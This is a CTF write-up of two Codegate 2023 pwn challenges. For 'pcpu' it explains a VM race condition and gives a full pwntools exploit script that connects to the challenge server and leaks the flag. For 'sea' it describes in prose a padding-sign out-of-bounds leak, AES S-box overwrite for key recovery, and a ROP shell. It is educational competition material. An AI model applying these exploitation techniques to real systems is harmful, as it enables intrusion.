Taking a break from my academic research, I played Codegate CTF 2023 this weekend with r3kapig. I solved two challenges: pcpu and sea, and both of them are quite interesting so here is the write-up for them. Thanks to the successful resolution of challenge sea in the last 20 minutes, our team manages to qualify for the finals. :)

## pcpu

### 0x00 Overview

The program implements an virtual machine for a very simple customized register-based instruction set. The virtual register value can either be an integer or a reference to a list of integers, and the instructions involve operations setting and getting the value of the register or the element of the list. The VM is implemented as a pipeline: in each execution cycle, multiple threads are created to perform different tasks. Due to such multi-threading, race condition can occur that allows us to tamper some important data, which allows us to leak the flag.

### 0x01 Reverse Engineering

**Instruction Loading.** The function `0x2430` reads each instruction as an 32-bit integer and store them into an array. It executes `precheck.py` to check the validity of our instructions. This script simply executes these instructions and bails out if any error occurs, and in this case the program also exits. We can read this script to get some understanding of the semantics of the instructions. We can learn from this script that the register can not only be an integer but also be a reference to a list of integers. For example, `inst == 2` creates such list and assign its reference to the destination register.

**Execution Pipeline.** The function `0x26F0` executes one cycle of the pipeline, which is achieved using 5 threads. Among them, thread functions `0x1640`, `0x1550` and `0x12D0` simply moves the instruction from one queue to another while removing some unused bytes in some instructions, which are uninteresting. The thread function `0x16F0` executes the instruction obtained from the queue, but for operation that modifies the register value (e.g., move `X1` to `X0`), the actual task to do is stored into another queue. Such queue is popped in the last thread function `0x1E60`, which actually execute any register write scheduled in `0x16F0`.

**Register Storing List.** One unique feature of this virtual instruction set is that the value of a register can actually be a reference to a list. The function `0x2270` is used to allocate a list, which allocate a structure from `0x6230`. `0x6230` stores an array of 4 structures, each of which has the following field layout shown below. Such structure represents a list that could be referenced by a register. The function `0x2270` finds an element in this global array with field `is_free == 1`, which means the list is currently not referenced by any register. For such element, its field `is_free` is set to zero and its pointer is assigned to the corresponding register. In addition, before returning, `0x2270` also fetches a string pointer from `0x6100` (which is a pointer to an array of string pointers) indexed by field `rand_digit`, and copy this string into the field `list` (which overlap with `rand_digit` because they are not used at the same time). We should note that index 10 of `0x6100` is the flag. However, `rand_digit` can only be within the range `0-9`, which cannot allow us to access the flag string in normal situation. In addition, when a register pointing to a list is re-written by another value, the structure representing the list will be freed again by setting `is_free` to `1` and resetting `rand_digit` to a value within range `0-9`.

```c
struct reg_list {
  uint64_t is_free;
  union {
    uint64_t rand_digit; // used when is_free == 1
    uint8_t list[0x10000]; // used when is_free == 0
  }
};
```

### 0x02 Vulnerabilty

Actually, there are many problems in the program. For example, the VM of `precheck.py` is inconsistent with VM of the binary program, which could cause type confusion. However, such type confusion does not seem to be exploitable. The actual problem that we use to solve the challenge is the race condition.

As we have mentioned earlier, the register rewrite is performed in a different thread (`0x1E60`, including freeing the `reg_list` structure) from another operation like writing element in a list referenced by a register (thread `0x16F0`). We have also found that there is a `sleep` function called in some element operations. For example, writing element of a list referenced by a register:

```c
/* code snippet in function 0x16F0 */
// obtain the register value
v17 = (reg_list *)*registers;
// sleep that is long enough for other threads to terminate
sleep(1u);
// write element at index specified by the third byte to immediate number specified by the forth byte
v17->list[(unsigned __int8)ptr->third_byte] = ptr->high_byte;
```

Consider we have two consecutive instructions: `X0 = reg` and `X0[idx] = val`. We should note that writing `X0` (and also freeing list referenced by `X0`) and writing `X0[idx]` are both executed in the *same cycle*, by thread function `0x1E60` and thread function `0x16F0` respectively. Therefore, if we can fetch `*register` (`X0`) to `v17` before the list referenced by `X0` is freed by `0x1E60`, after `sleep(1)` the `v17` will point to a `reg_list` structure with `is_free == 1`; thus, we can write field `list` of a freed `reg_list` structure, which is now interpreted as `rand_digit`! Therefore, by setting the first byte to `10`, we can actually load the flag content into the list when this corrupted `reg_list` is allocated again. The full exploit is shown below:

```python
from pwn import *

context(log_level='info')

sh = remote("43.202.54.209", 1234)
# sh = process("./app")
# gdb.attach(sh, "c")
# sleep(2)

def send_insts(insts):
    sh.sendlineafter(b"Inst Size >", str(len(insts)).encode())
    for inst in insts:
        sh.sendline(str(u32(inst)).encode())
    for inst in insts:
        sh.recvuntil(b" > ")

alloc_list = lambda reg : p8(2) + p8(reg) + p16(0xffff)
read_reg_idx = lambda dst, src, idx : p8(4) + p8(dst) + p8(src) + p8(idx)
write_reg0_idx = lambda idx, data : p8(3) + p8(0) + p8(idx) + p8(data)
copy_reg = lambda dst, src : p8(1) + p8(dst) + p8(0) + p8(src)
dump_regs = lambda : p32(7)

prog = [alloc_list(0), alloc_list(1), # allocate 2 buffers
    copy_reg(0, 1), # transfer x1 to x0, x0 will be released
    write_reg0_idx(0, 10),
    # if x0 is first fetched, and sleep, and then released, released buffer is rewritten
    alloc_list(3), # now new buffer allocation gives OOB access
    dump_regs(), # ensure alloc is commited before any idx R/W
]

for i in range(0, 78):
    prog.append(read_reg_idx(2, 3, i))
    prog.append(dump_regs())

send_insts(prog)

flag = []
sh.recvuntil(b"X2 : 0x")
for i in range(0, 78):
    sh.recvuntil(b"X2 : 0x")
    flag.append(int(sh.recvuntil(b"\n"), 16))
    if flag[0] != ord('c'):
        exit(1)
    print(len(flag), b"".join(map(lambda x: bytes([x]), flag)))

sh.interactive()

# codegate2023{a77f1e5998a7d38c0e1f77274a344f142a7ff9d167e1419d41d6489fb138bb45}

```

Due to race condition, we need to run it for several times in order to be able to achieve the scenario we want. In addition, due to the same race condition problem, we sometimes get the wrong flag because for some bytes the `X2` is printed before it is loaded with the flag content, but this can be easily fixed manually by comparing flags from different runs.

### 0x00 Overview

The program implements a simple AES-CBC encryption and decryption service, with `key` and `iv` being randomly generated and unknown to us. However, after each decryption the `key` and `iv` are re-generated. There are three vulnerabilities in the program: we firstly leak the pointers and canary via an out-of-bounds read in decryption; we then use a data segment overflow in the hexadecimal parser to rewrite the constants used by AES, so that `key` and `iv` can be leaked; finally, a stack overflow filled with encrypted data is exploited to get the code execution.

### 0x01 OOB Read to Leak Stack Data

In decryption, the function `0x15A1` is called to unpad the decrypted data. However, the sign of the padding byte is used incorrectly, which causes the problem when padding byte is larger than `0x7f` (e.i., being negative when used as signed char). The problem is shown in the code snippet below.

```c
if ( (char)last_byte <= 16 && len ) // signed comparison, so negative byte can pass the check
{
  while ( last_byte > i ) // unsigned comparison
  {
    if ( src[(unsigned int)last_idx - i] != last_byte ) // unsigned subtraction
      return -1;
    ++i;
  }
  memset(dst, 0, len);
  v12 = len - (char)last_byte; // signed subtraction, so a negative byte can increase the length!
  result = 0;
  *new_len = v12;
  qmemcpy(dst, src, v12);
}
```

For example, if the decrypted data is `'A' * 0x10 + '\x80' * 0x80`, the `last_byte` will be `0x80(-128)`. Due to its incorrect sign handling, these 128 padding bytes can be successfully unpaded, and finally the length is increased by 128, which causes the out-of-bounds read of the stack buffer. This could leak program base, `libc` base and canary.

To have decrypted data `'A' * 0x10 + '\x80' * 0x80`, we first use the encryption oracle to encrypt `'A' * 0x10 + '\x80' * 0x80`, which will be padded and the actual data encrypted will be `'A' * 0x10 + '\x80' * 0x80 + '\x10' * 0x10`. Due to the property of AES-CBC, we can simply remove the last block (0x10 bytes) of the encrypted data and send such truncated encrypted data to the decryption oracle, so that the decrypted data can be `'A' * 0x10 + '\x80' * 0x80`.

### 0x02 Leaking Key and Initialization Vector

In hexadecimal parser function `0x1470`, `0x800` bytes are read into `0x4020` at `.data` segment. However, the buffer has only 288 bytes, and the following bytes are round constants, S-box, and inverse S-box used by AES algorithm. According to this [paper](https://www.cosic.esat.kuleuven.be/wissec2006/papers/10.pdf), after setting the S-box to zeros, the ciphertext generated by encrypting any data can be used to recover the key easily.

![Recovering Last Expanded Key](/images/AES_SBOX_1.png)
![Recovering Original Key](/images/AES_SBOX_2.png)

In our scenario, since we can also write round constants, $$r_i$$ in the paper can also be re-written to zeros. Therefore, we can simply recover the key by `kw[0:8] + p32(u32(kw[8:12]) ^ u32(kw[0:4])) + p32(u32(kw[12:16]) ^ u32(kw[4:8]))`, where `kw` is the last expanded key, which is any ciphertext block generated by such corrupted AES.

After recovering the key, we use the overflow again to recover the constants of AES, and `iv` can be recovered by decrypting a block of ciphertext (obtained by encrypting a plaintext block using the encryption oracle) using ECB with the recovered `key` and calculating `xor` of decrypted block and the plaintext.

### 0x03 Code Execution

Finally, we can use the stack overflow in encryption to get the code execution. Since our data is encrypted, we need to firstly decrypt our payload with leaked `key` and `iv` locally. However, since the ROP chain is quite small, we firstly pivot the stack onto `.data` segment and then execute the `"/bin/sh"`. This work is done by [@n132](https://github.com/n132).

PS: I broke my WSL in the last hour of the CTF due to replacing system `ld` with the `ld` used by this challenge, so I asked my teammate n132 to finish the last step of the exploitation. Lesson learned: never do this again. :)
